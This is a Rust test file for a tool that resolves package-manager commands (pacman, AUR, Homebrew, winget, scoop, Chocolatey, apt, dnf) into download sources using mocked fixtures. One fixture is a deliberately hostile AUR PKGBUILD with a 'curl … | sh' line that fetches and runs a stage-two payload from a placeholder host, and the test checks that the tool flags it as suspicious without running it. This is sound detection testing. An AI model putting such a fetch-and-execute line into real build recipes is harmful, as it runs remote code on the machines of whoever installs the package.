//! Offline resolver tests with recorded fixtures (tests/fixtures/) and
//! archives built in the test.

mod common;

use bytebouncer_adapters::{
    HostInfo, Manager, NoHostCommands, Resolution, ResolveError, parse_command_str, resolve,
};
use common::{MockFetcher, MockHost, fixture, tarball, temp_dir};

fn run(cmd: &str, f: &MockFetcher, info: &HostInfo) -> Resolution {
    let req = parse_command_str(cmd).unwrap();
    resolve(&req, f, &NoHostCommands, info).unwrap_or_else(|e| panic!("{cmd}: {e}"))
}

fn linux() -> HostInfo {
    HostInfo::minimal("x86_64", "linux")
}

// ------------------------------------------------------------------ pacman

const CURL_DESC: &str = "%FILENAME%\ncurl-8.22.0-1-x86_64.pkg.tar.zst\n\n%NAME%\ncurl\n\n%BASE%\ncurl\n\n%VERSION%\n8.22.0-1\n\n%SHA256SUM%\n60b5c0ccc169cf1e36c95a5b2cab79d73c1490715e6b122828a9590fd2fcfc1c\n\n%PGPSIG%\naGVsbG8=\n\n%ARCH%\nx86_64\n\n%DEPENDS%\nca-certificates\nkrb5\n\n";
const FOO_DESC: &str = "%FILENAME%\nfoo-1.0-1-any.pkg.tar.zst\n\n%NAME%\nfoo\n\n%VERSION%\n1.0-1\n\n%ARCH%\nany\n\n%PROVIDES%\nbar=1.0\n\n%GROUPS%\ngrp\n\n";
const BAZ_DESC: &str = "%FILENAME%\nbaz-2-1-x86_64.pkg.tar.zst\n\n%NAME%\nbaz\n\n%VERSION%\n2-1\n\n%ARCH%\nx86_64\n\n%PROVIDES%\nshared\n\n%GROUPS%\ngrp\n\n";
const QUX_DESC: &str = "%FILENAME%\nqux-3-1-x86_64.pkg.tar.zst\n\n%NAME%\nqux\n\n%VERSION%\n3-1\n\n%ARCH%\nx86_64\n\n%PROVIDES%\nshared\n\n";

fn fake_pacman_host() -> (HostInfo, common::TempDir) {
    let dir = temp_dir("pacman");
    std::fs::create_dir_all(dir.join("db/sync")).unwrap();
    std::fs::write(
        dir.join("db/sync/core.db"),
        tarball(
            &[
                ("curl-8.22.0-1/desc", CURL_DESC),
                ("foo-1.0-1/desc", FOO_DESC),
            ],
            false,
        ),
    )
    .unwrap();
    std::fs::write(
        dir.join("db/sync/extra.db"),
        tarball(
            &[("baz-2-1/desc", BAZ_DESC), ("qux-3-1/desc", QUX_DESC)],
            true,
        ),
    )
    .unwrap();
    std::fs::write(
        dir.join("mirrorlist"),
        "## comment\n#Server = https://commented.example/$repo/os/$arch\nServer = https://mirror.example/$repo/os/$arch\nServer = https://second.example/$repo/os/$arch\n",
    )
    .unwrap();
    std::fs::write(
        dir.join("pacman.conf"),
        "[options]\nArchitecture = auto\nSigLevel = Required DatabaseOptional\n\n[core]\nInclude = /etc/pacman.d/mirrorlist\n\n[extra]\nServer = https://direct.example/extra/os/$arch/\n\n#[multilib]\n#Include = /etc/pacman.d/mirrorlist\n\n[missing]\nServer = https://x\n",
    )
    .unwrap();
    let host = HostInfo {
        pacman_db_path: Some(dir.join("db")),
        pacman_conf: Some(dir.join("pacman.conf")),
        mirrorlist: Some(dir.join("mirrorlist")),
        ..linux()
    };
    (host, dir)
}

#[test]
fn pacman_resolves_from_sync_db() {
    let (info, _dir) = fake_pacman_host();
    let f = MockFetcher::new();
    let r = run("pacman -S curl extra/baz bar", &f, &info);
    assert!(f.requested().is_empty(), "pacman must not fetch");
    assert_eq!(r.packages.len(), 3, "{r:#?}");
    let curl = &r.packages[0];
    assert_eq!(curl.name, "curl");
    assert_eq!(curl.version, "8.22.0-1");
    assert_eq!(curl.repository.as_deref(), Some("core"));
    assert_eq!(curl.dependencies, vec!["ca-certificates", "krb5"]);
    let s = &curl.sources[0];
    assert_eq!(
        s.url,
        "https://mirror.example/core/os/x86_64/curl-8.22.0-1-x86_64.pkg.tar.zst"
    );
    assert_eq!(
        s.expected_sha256.as_deref(),
        Some("60b5c0ccc169cf1e36c95a5b2cab79d73c1490715e6b122828a9590fd2fcfc1c")
    );
    assert_eq!(s.signature_url.as_deref(), Some(&*format!("{}.sig", s.url)));
    assert_eq!(
        r.embedded_signatures,
        vec![(
            "curl-8.22.0-1-x86_64.pkg.tar.zst.sig".to_string(),
            b"hello".to_vec()
        )]
    );
    // zstd-compressed DB, Server given directly with trailing slash.
    assert_eq!(
        r.packages[1].sources[0].url,
        "https://direct.example/extra/os/x86_64/baz-2-1-x86_64.pkg.tar.zst"
    );
    // `bar` is provided by foo.
    assert_eq!(r.packages[2].name, "foo");
    assert!(r.notes.iter().any(|n| n.contains("provided by core/foo")));
    assert!(
        r.notes
            .iter()
            .any(|n| n.contains("sync DB core.db last updated"))
    );
    assert!(
        r.notes
            .iter()
            .any(|n| n.contains("[missing] has no readable sync DB"))
    );
    assert!(r.unresolved.is_empty(), "{:?}", r.unresolved);
}

#[test]
fn pacman_unresolved_cases() {
    let (info, _dir) = fake_pacman_host();
    let f = MockFetcher::new();
    let r = run("pacman -S nope grp shared core/baz testing/curl", &f, &info);
    assert!(r.packages.is_empty());
    let u = r.unresolved.join("\n");
    assert!(u.contains("target not found in sync DBs: nope"), "{u}");
    assert!(u.contains("`grp` is a package group (2 members"), "{u}");
    assert!(u.contains("provided by several packages"), "{u}");
    assert!(u.contains("target not found in sync DBs: core/baz"), "{u}");
    assert!(u.contains("repository `testing` is not enabled"), "{u}");
}

#[test]
fn pacman_without_configuration_is_unavailable() {
    let req = parse_command_str("pacman -S curl").unwrap();
    let e = resolve(&req, &MockFetcher::new(), &NoHostCommands, &linux()).unwrap_err();
    assert!(matches!(e, ResolveError::ManagerUnavailable(_)), "{e}");
}

// --------------------------------------------------------------------- AUR

const AUR_RPC_YAY: &str = "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=yay";
const AUR_SNAP_YAY: &str = "https://aur.archlinux.org/cgit/aur.git/snapshot/yay.tar.gz";

#[test]
fn aur_yay_from_recorded_fixtures() {
    let f = MockFetcher::new()
        .with(AUR_RPC_YAY, fixture("aur_yay.json"))
        .with(AUR_SNAP_YAY, fixture("aur_yay_snapshot.tar.gz"));
    let r = run("yay -S yay", &f, &linux());
    assert_eq!(r.packages.len(), 1, "{r:#?}");
    let p = &r.packages[0];
    assert_eq!(p.name, "yay");
    assert_eq!(p.version, "13.0.1-1");
    assert_eq!(p.repository.as_deref(), Some("aur"));
    assert_eq!(p.arch.as_deref(), Some("x86_64"));
    assert_eq!(p.dependencies, vec!["pacman>6.1", "git"]);
    assert_eq!(p.sources.len(), 1);
    assert_eq!(
        p.sources[0].url,
        "https://github.com/Jguer/yay/archive/v13.0.1.tar.gz"
    );
    assert_eq!(p.sources[0].file_name, "yay-13.0.1.tar.gz");
    assert_eq!(
        p.sources[0].expected_sha256.as_deref(),
        Some("b77454bce87110180a1b6664c2d260de78124c9894b71101610ba84f551eb0d0")
    );
    assert!(p.recipe_files.contains(&"PKGBUILD".to_string()));
    assert!(p.recipe_files.contains(&".SRCINFO".to_string()));
    assert!(
        r.recipe_files
            .iter()
            .any(|f| f.path == "PKGBUILD" && f.origin.ends_with("#PKGBUILD"))
    );
    assert!(r.unresolved.is_empty(), "{:?}", r.unresolved);
    assert!(r.observations.is_empty(), "{:?}", r.observations);
    assert!(
        r.notes
            .iter()
            .any(|n| n.contains("functions (run during build"))
    );
}

#[test]
fn aur_prefers_sync_repos() {
    let (info, _dir) = fake_pacman_host();
    let f = MockFetcher::new();
    let r = run("paru -S curl", &f, &info);
    assert!(f.requested().is_empty());
    assert_eq!(r.packages[0].repository.as_deref(), Some("core"));
}

const EVIL_PKGBUILD: &str = r#"
pkgname=evil
pkgver=1.0
pkgrel=1
arch=(x86_64)
install=evil.install
_v=$(curl -s https://example.invalid/v)
source=("https://example.org/evil-$pkgver.tar.gz"
        "https://example.org/evil-$pkgver.tar.gz.sig"
        "git+https://example.org/evil.git"
        "https://example.org/$_v.tar.gz"
        "fix.patch"
        "missing.patch")
source_x86_64=("https://example.org/bin-$pkgver-x86_64.zip")
source_aarch64=("https://example.org/bin-$pkgver-aarch64.zip")
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111' SKIP SKIP SKIP SKIP SKIP)
sha256sums_x86_64=('2222222222222222222222222222222222222222222222222222222222222222')
b2sums_x86_64=('abcd')
curl -s https://example.invalid/stage2 | sh
prepare() { :; }
"#;

const EVIL_SRCINFO: &str = "pkgbase = evil\n\tpkgver = 0.9\n\tpkgrel = 1\n\tsource = https://example.org/evil-1.0.tar.gz\n\npkgname = evil\n";

#[test]
fn aur_hostile_pkgbuild_is_reported_not_run() {
    let snap = tarball(
        &[
            ("evil/PKGBUILD", EVIL_PKGBUILD),
            ("evil/.SRCINFO", EVIL_SRCINFO),
            ("evil/evil.install", "post_install() { :; }"),
            ("evil/fix.patch", "--- a\n+++ b\n"),
        ],
        false,
    );
    let rpc = r#"{"resultcount":1,"results":[{"Name":"evil","PackageBase":"evil","Version":"1.0-1","URLPath":"/cgit/aur.git/snapshot/evil.tar.gz","Maintainer":null,"OutOfDate":1700000000,"Depends":[]}],"type":"multiinfo","version":5}"#;
    let f = MockFetcher::new()
        .with(
            "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=evil",
            rpc.as_bytes().to_vec(),
        )
        .with(
            "https://aur.archlinux.org/cgit/aur.git/snapshot/evil.tar.gz",
            snap,
        );
    let r = run("yay -S aur/evil", &f, &linux());
    let p = &r.packages[0];
    let urls: Vec<&str> = p.sources.iter().map(|s| s.url.as_str()).collect();
    assert_eq!(
        urls,
        vec![
            "https://example.org/evil-1.0.tar.gz",
            "https://example.org/bin-1.0-x86_64.zip"
        ]
    );
    assert_eq!(
        p.sources[0].signature_url.as_deref(),
        Some("https://example.org/evil-1.0.tar.gz.sig")
    );
    assert!(
        p.sources[1]
            .expected_sha256
            .as_deref()
            .unwrap()
            .starts_with("2222")
    );
    let u = r.unresolved.join("\n");
    assert!(u.contains("VCS sources not supported"), "{u}");
    assert!(u.contains("command substitution"), "{u}");
    assert!(u.contains("local source `missing.patch`"), "{u}");
    assert!(!u.contains("fix.patch"), "{u}");
    let kinds: Vec<&str> = r.observations.iter().map(|o| o.kind.as_str()).collect();
    assert!(kinds.contains(&"pkgbuild.top_level_command"), "{kinds:?}");
    assert!(kinds.contains(&"srcinfo.mismatch"), "{kinds:?}");
    let n = r.notes.join("\n");
    assert!(n.contains("SUSPICIOUS"), "{n}");
    assert!(n.contains("orphaned"), "{n}");
    assert!(n.contains("out-of-date"), "{n}");
    assert!(n.contains("install scriptlet `evil.install`"), "{n}");
    assert!(n.contains("source_aarch64"), "{n}");
    assert!(n.contains("b2sums=abcd"), "{n}");
}

#[test]
fn aur_not_found() {
    let f = MockFetcher::new().with(
        "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=nope",
        br#"{"resultcount":0,"results":[],"type":"multiinfo","version":5}"#.to_vec(),
    );
    let r = run("yay -S nope", &f, &linux());
    assert!(r.unresolved[0].contains("not found in sync repositories or the AUR"));
}

// ---------------------------------------------------------------- Homebrew

const WGET_JSON: &str = "https://formulae.brew.sh/api/formula/wget.json";
const WGET_RB: &str = "https://raw.githubusercontent.com/Homebrew/homebrew-core/4e03f0cdf2ebcaf50fe266f046277d5d56345f78/Formula/w/wget.rb";
const GHCR_TOKEN: &str =
    "https://ghcr.io/token?service=ghcr.io&scope=repository:homebrew/core/wget:pull";

#[test]
fn brew_formula_with_bottle_and_token() {
    let f = MockFetcher::new()
        .with(WGET_JSON, fixture("brew_formula_wget.json"))
        .with(WGET_RB, fixture("brew_wget.rb"))
        .with(GHCR_TOKEN, br#"{"token":"abc123"}"#.to_vec());
    let r = run("brew install wget", &f, &linux());
    let p = &r.packages[0];
    assert_eq!(p.name, "wget");
    assert_eq!(p.version, "1.25.0_2");
    assert_eq!(p.arch.as_deref(), Some("x86_64_linux"));
    assert_eq!(p.repository.as_deref(), Some("homebrew/core"));
    assert_eq!(p.recipe_files, vec!["wget.rb"]);
    let bottle = &p.sources[0];
    assert!(
        bottle
            .url
            .starts_with("https://ghcr.io/v2/homebrew/core/wget/blobs/sha256:32d971ac")
    );
    assert_eq!(
        bottle.file_name,
        "wget--1.25.0_2.x86_64_linux.bottle.tar.gz"
    );
    assert!(
        bottle
            .expected_sha256
            .as_deref()
            .unwrap()
            .starts_with("32d971ac")
    );
    assert_eq!(
        p.sources[1].url,
        "https://ftpmirror.gnu.org/wget/wget-1.25.0.tar.gz"
    );
    assert!(
        p.sources.iter().any(|s| s.url.ends_with(".diff")),
        "patch recorded"
    );
    assert_eq!(r.source_headers.len(), 1);
    assert_eq!(r.source_headers[0].url, bottle.url);
    assert_eq!(
        r.source_headers[0].headers,
        vec![("Authorization".to_string(), "Bearer abc123".to_string())]
    );
    assert!(
        p.dependencies.contains(&"zlib-ng-compat".to_string()),
        "linux variation deps"
    );
    assert!(
        !r.notes.iter().any(|n| n.contains("differs from the API")),
        "{:?}",
        r.notes
    );
    assert!(r.unresolved.is_empty(), "{:?}", r.unresolved);
}

#[test]
fn brew_macos_without_tag_lists_bottles() {
    let f = MockFetcher::new()
        .with(WGET_JSON, fixture("brew_formula_wget.json"))
        .with(WGET_RB, fixture("brew_wget.rb"));
    let r = run(
        "brew install --formula wget",
        &f,
        &HostInfo::minimal("aarch64", "macos"),
    );
    let p = &r.packages[0];
    assert_eq!(p.sources.len(), 2, "source + patch only");
    assert!(
        r.notes
            .iter()
            .any(|n| n.contains("no bottle for this host") && n.contains("arm64_tahoe"))
    );
}

#[test]
fn brew_cask_fallback_and_hooks() {
    let f = MockFetcher::new()
        .with(
            "https://formulae.brew.sh/api/cask/docker-desktop.json",
            fixture("brew_cask_docker-desktop.json"),
        )
        .with(
            "https://raw.githubusercontent.com/Homebrew/homebrew-cask/d0cb36ab9674b10555c2df4abc60f75faae25c9d/Casks/d/docker-desktop.rb",
            fixture("brew_docker-desktop.rb"),
        );
    let r = run("brew install docker-desktop", &f, &linux());
    // Formula lookup 404s first, then the cask resolves.
    assert_eq!(
        f.requested()[0],
        "https://formulae.brew.sh/api/formula/docker-desktop.json"
    );
    let p = &r.packages[0];
    assert_eq!(p.repository.as_deref(), Some("homebrew/cask"));
    assert_eq!(p.version, "4.95.0,242831");
    assert!(p.sources[0].url.starts_with("https://desktop.docker.com/"));
    assert!(p.sources[0].expected_sha256.is_some());
    assert!(
        r.observations.iter().any(|o| o.kind == "brew.cask_hook"),
        "{:?}",
        r.observations
    );
    assert!(r.notes.iter().any(|n| n.contains("targets macOS")));
    assert!(r.notes.iter().any(|n| n.contains("uninstall stanza")));
    assert_eq!(r.recipe_files[0].path, "docker-desktop.rb");
}

#[test]
fn brew_cask_no_check_and_third_party_tap() {
    let cask = r#"{"token":"x","version":"latest","url":"https://example.org/x.dmg","sha256":"no_check","artifacts":[{"app":["X.app"]},{"postflight":null}],"depends_on":{},"variations":{},"ruby_source_path":"Casks/x/x.rb"}"#;
    let f = MockFetcher::new()
        .with(
            "https://formulae.brew.sh/api/cask/x.json",
            cask.as_bytes().to_vec(),
        )
        .with(
            "https://raw.githubusercontent.com/someone/homebrew-tools/HEAD/Formula/tool.rb",
            b"class Tool < Formula\nend\n".to_vec(),
        );
    let r = run(
        "brew install --cask x someone/tools/tool",
        &f,
        &HostInfo::minimal("aarch64", "macos"),
    );
    let u = r.unresolved.join("\n");
    assert!(u.contains(":no_check"), "{u}");
    assert!(u.contains("third-party tap"), "{u}");
    assert!(r.recipe_files.iter().any(|f| f.path == "tool.rb"));
    assert!(
        r.observations
            .iter()
            .any(|o| o.kind == "brew.cask_hook" && o.detail.contains("postflight"))
    );
}

// ------------------------------------------------------------------ winget

const WINGET_LIST: &str =
    "https://api.github.com/repos/microsoft/winget-pkgs/contents/manifests/7/7zip/7zip";
const WINGET_RAW: &str =
    "https://raw.githubusercontent.com/microsoft/winget-pkgs/master/manifests/7/7zip/7zip";

fn winget_fetcher() -> MockFetcher {
    MockFetcher::new()
        .with(WINGET_LIST, fixture("winget_7zip_list.json"))
        .with(
            &format!("{WINGET_RAW}/26.04/7zip.7zip.installer.yaml"),
            fixture("winget_7zip.7zip.installer.yaml"),
        )
        .with(
            &format!("{WINGET_RAW}/26.04/7zip.7zip.yaml"),
            fixture("winget_7zip.7zip.yaml"),
        )
        .with(
            &format!("{WINGET_RAW}/26.04/7zip.7zip.locale.en-US.yaml"),
            fixture("winget_7zip.7zip.locale.en-US.yaml"),
        )
}

#[test]
fn winget_highest_version_x64() {
    let f = winget_fetcher();
    let r = run(
        "winget install --id 7zip.7zip --exact",
        &f,
        &HostInfo::minimal("x86_64", "windows"),
    );
    let (_, headers) = &f.requests.borrow()[0];
    assert!(headers.iter().any(|(k, _)| k == "User-Agent"));
    let p = &r.packages[0];
    assert_eq!(p.version, "26.04");
    assert_eq!(p.arch.as_deref(), Some("x64"));
    let urls: Vec<&str> = p.sources.iter().map(|s| s.url.as_str()).collect();
    assert_eq!(
        urls,
        vec![
            "https://www.7-zip.org/a/7z2604-x64.exe",
            "https://www.7-zip.org/a/7z2604-x64.msi"
        ]
    );
    assert_eq!(
        p.sources[0].expected_sha256.as_deref(),
        Some("d54bf805f9f3704d1e8db2fa3498ae7ef2df0312b40b558e7c71c734430a665d")
    );
    assert_eq!(p.recipe_files.len(), 3);
    assert_eq!(
        r.notes.iter().filter(|n| n.contains("installer[")).count(),
        6
    );
    assert!(r.notes.iter().any(|n| n.contains("InstallerSwitches=")));
}

#[test]
fn winget_arm64_and_explicit_version() {
    let f = winget_fetcher();
    let r = run(
        "winget install --id 7zip.7zip -e --version 26.04",
        &f,
        &HostInfo::minimal("aarch64", "windows"),
    );
    assert!(
        !f.requested()
            .iter()
            .any(|u| u.starts_with("https://api.github.com")),
        "no listing with --version"
    );
    let p = &r.packages[0];
    assert_eq!(p.arch.as_deref(), Some("arm64"));
    assert_eq!(p.sources.len(), 1);
    assert!(p.sources[0].url.ends_with("7z2604-arm64.exe"));
}

#[test]
fn winget_rate_limit_and_missing() {
    let f = MockFetcher::new().status(WINGET_LIST, 403);
    let req = parse_command_str("winget install --id 7zip.7zip -e").unwrap();
    let e = resolve(&req, &f, &NoHostCommands, &linux()).unwrap_err();
    assert!(matches!(e, ResolveError::RateLimited(_)), "{e}");
    assert!(e.to_string().contains("60 requests/hour"));

    let r = run(
        "winget install --id Nobody.Nothing -e",
        &MockFetcher::new(),
        &linux(),
    );
    assert!(r.unresolved[0].contains("not found in winget-pkgs"));
}

// ------------------------------------------------------------------- scoop

const SCOOP_MAIN_7ZIP: &str =
    "https://raw.githubusercontent.com/ScoopInstaller/Main/master/bucket/7zip.json";

#[test]
fn scoop_main_bucket() {
    let f = MockFetcher::new().with(SCOOP_MAIN_7ZIP, fixture("scoop_7zip.json"));
    let r = run(
        "scoop install 7zip",
        &f,
        &HostInfo::minimal("x86_64", "windows"),
    );
    let p = &r.packages[0];
    assert_eq!(p.version, "26.04");
    assert_eq!(p.arch.as_deref(), Some("64bit"));
    assert_eq!(p.repository.as_deref(), Some("scoop/main"));
    assert_eq!(
        p.sources[0].url,
        "https://github.com/ip7z/7zip/releases/download/26.04/7z2604-x64.msi"
    );
    assert_eq!(
        p.sources[0].expected_sha256.as_deref(),
        Some("0b01334a418654293513449f61d6bfc99e5196ca371e3c3dc961eda57cd535c6")
    );
    let paths: Vec<&str> = r.recipe_files.iter().map(|f| f.path.as_str()).collect();
    assert_eq!(
        paths,
        vec![
            "7zip.json",
            "7zip.post_install.ps1",
            "7zip.uninstaller.script.ps1"
        ]
    );
    assert_eq!(
        r.observations
            .iter()
            .filter(|o| o.kind == "scoop.script")
            .count(),
        2
    );
}

#[test]
fn scoop_arch_scripts_extras_fallback_and_buckets() {
    let f = MockFetcher::new().with(
        "https://raw.githubusercontent.com/ScoopInstaller/Extras/master/bucket/7zip.json",
        fixture("scoop_7zip.json"),
    );
    let r = run(
        "scoop install 7zip unknown/app 7zip@1.0",
        &f,
        &HostInfo::minimal("aarch64", "windows"),
    );
    assert_eq!(r.packages.len(), 1);
    assert_eq!(r.packages[0].repository.as_deref(), Some("scoop/extras"));
    assert!(
        r.recipe_files
            .iter()
            .any(|f| f.path == "7zip.arm64.pre_install.ps1")
    );
    let u = r.unresolved.join("\n");
    assert!(u.contains("bucket `unknown`"), "{u}");
    assert!(u.contains("autoupdate"), "{u}");
}

// -------------------------------------------------------------- chocolatey

const CHOCO_P1: &str = "https://community.chocolatey.org/api/v2/FindPackagesById()?id=%277zip%27";
const CHOCO_P2: &str = "https://community.chocolatey.org/api/v2/FindPackagesById?id='7zip'&$skiptoken='1758238496137','16.1.0','7zip'";

fn choco_fetcher() -> MockFetcher {
    MockFetcher::new()
        .with(CHOCO_P1, fixture("choco_7zip_page1.xml"))
        .with(CHOCO_P2, fixture("choco_7zip_page2.xml"))
}

#[test]
fn choco_latest_stable() {
    let r = run("choco install 7zip -y", &choco_fetcher(), &linux());
    let p = &r.packages[0];
    assert_eq!(p.name, "7zip");
    assert_eq!(p.version, "26.4.0");
    assert_eq!(
        p.sources[0].url,
        "https://community.chocolatey.org/api/v2/package/7zip/26.4.0"
    );
    assert_eq!(p.sources[0].file_name, "7zip.26.4.0.nupkg");
    assert_eq!(
        p.sources[0].expected_sha512.as_ref().map(|h| h.len()),
        Some(128)
    );
    assert_eq!(p.dependencies, vec!["7zip.install [26.4.0]"]);
    assert!(r.notes.iter().any(|n| n.contains("meta-package")));
}

#[test]
fn choco_prerelease_and_pinned_version() {
    let r = run("choco install 7zip --pre", &choco_fetcher(), &linux());
    assert_eq!(r.packages[0].version, "27.0.0-beta");
    let r = run(
        "choco install 7zip --version 16.01",
        &choco_fetcher(),
        &linux(),
    );
    assert_eq!(r.packages[0].version, "16.01");
    let r = run(
        "choco install 7zip --version 1.2.3",
        &choco_fetcher(),
        &linux(),
    );
    assert!(r.packages.is_empty());
    assert!(r.unresolved[0].contains("1.2.3"));
}

// ------------------------------------------------------------- apt / dnf

const APT_OUT: &str = "'http://deb.debian.org/debian/pool/main/c/curl/curl_7.88.1-10%2bdeb12u12_amd64.deb' curl_7.88.1-10+deb12u12_amd64.deb 315972 SHA256:6c4bdbc6d4c5f2b1c1e9e5b1a0c6e3a2e4f5d6c7b8a9f0e1d2c3b4a596877869\n";
const APT_SHOW: &str = "Package: curl\nVersion: 7.88.1-10+deb12u12\nDepends: libc6 (>= 2.34), libcurl4 (= 7.88.1-10+deb12u12), zlib1g (>= 1:1.1.4)\n\n";

#[test]
fn apt_print_uris_fixture() {
    let host = MockHost::default()
        .with("apt-get --print-uris --quiet download curl", APT_OUT)
        .with("apt-cache show --no-all-versions curl", APT_SHOW);
    let info = HostInfo {
        has_apt: true,
        ..linux()
    };
    let req = parse_command_str("apt install -y curl").unwrap();
    assert_eq!(req.manager, Manager::Apt);
    let r = resolve(&req, &MockFetcher::new(), &host, &info).unwrap();
    let p = &r.packages[0];
    assert_eq!(p.name, "curl");
    assert_eq!(p.version, "7.88.1-10+deb12u12");
    assert_eq!(p.arch.as_deref(), Some("amd64"));
    assert!(
        p.sources[0]
            .expected_sha256
            .as_deref()
            .unwrap()
            .starts_with("6c4bdbc6")
    );
    assert_eq!(p.dependencies.len(), 3);
    assert!(r.notes.iter().any(|n| n.contains("apt keyring")));

    let e = resolve(&req, &MockFetcher::new(), &host, &linux()).unwrap_err();
    assert!(matches!(e, ResolveError::ManagerUnavailable(_)));
}

#[test]
fn dnf_download_url_fixture() {
    let host = MockHost::default()
        .with(
            "dnf download --url --quiet curl",
            "Last metadata expiration check: 0:01:02 ago.\nhttps://mirror.example/fedora/40/x86_64/Packages/c/curl-8.6.0-7.fc40.i686.rpm\nhttps://mirror.example/fedora/40/x86_64/Packages/c/curl-8.6.0-7.fc40.x86_64.rpm\n",
        )
        .with(
            "dnf repoquery --quiet --requires --latest-limit=1 curl",
            "libc.so.6()(64bit)\nlibcurl(x86-64) >= 8.6.0-7.fc40\n",
        );
    let info = HostInfo {
        has_dnf: true,
        ..linux()
    };
    let req = parse_command_str("dnf install -y curl").unwrap();
    let r = resolve(&req, &MockFetcher::new(), &host, &info).unwrap();
    let p = &r.packages[0];
    assert_eq!(p.version, "8.6.0-7.fc40");
    assert_eq!(p.arch.as_deref(), Some("x86_64"));
    assert!(p.sources[0].url.ends_with("x86_64.rpm"));
    assert!(p.sources[0].expected_sha256.is_none());
    assert_eq!(p.dependencies.len(), 2);
}
